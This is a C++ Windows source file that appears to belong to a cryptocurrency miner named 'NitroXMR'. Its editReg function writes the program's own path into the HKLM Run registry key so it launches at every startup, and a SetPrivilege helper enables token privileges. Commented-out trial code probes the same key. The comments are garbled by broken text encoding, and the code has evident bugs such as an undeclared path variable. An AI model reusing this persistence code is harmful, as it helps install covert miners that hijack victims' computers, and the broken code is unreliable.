#include "stdafx.h"
#include "autoRun.h"

// executePath

//��Ȩ����������exp��

BOOL autoRun()
{
	//CRegKey reg;        //����ע������

	//
	//if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
	//{
	//	MessageBox(NULL, L"create!", L"info", MB_OK);
	//}

	//if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
	//{
	//	MessageBox(NULL, L"backup!", L"info", MB_OK);
	//}
	//
	//if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	//{

	//	MessageBox(NULL, L"key in", L"info", MB_OK);

	//	reg.Close();
	//}
	//else
	//{
	//	MessageBox(NULL, L"failed", L"info", MB_OK);
	//}

	
	return TRUE;
}

BOOL editReg()
{
	CString exePath;
	CRegKey reg;        //����ע������

						//HKEY hK;
						//RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
						//	0, KEY_WRITE | KEY_READ, &hK);
						//printf("%d\n", hK);
						//RegCloseKey(hK);

						//���ﾹȻ�Զ�����Software\\WOW6432node\\Microsoft\\Windows\\CurrentVersion\\Run
						//�����˰������˵��ô��ÿ�д�������û��!!!!!!F**K
						//����atl��,����Ҳͦ����

	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{

		HKEY hKey = reg.m_hKey;

		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
		{
			printf("%d\n", reg.m_hKey);

			//Ӧ�ô���������������ȴ����
			GetModuleFileName(NULL, executePath, MAX_PATH);

			reg.SetStringValue(L"NitroXMR", executePath);

			MessageBox(NULL, L"key in", L"info", NULL);

		}
		reg.Close();
		return TRUE;
	}
	return FALSE;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0)
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}
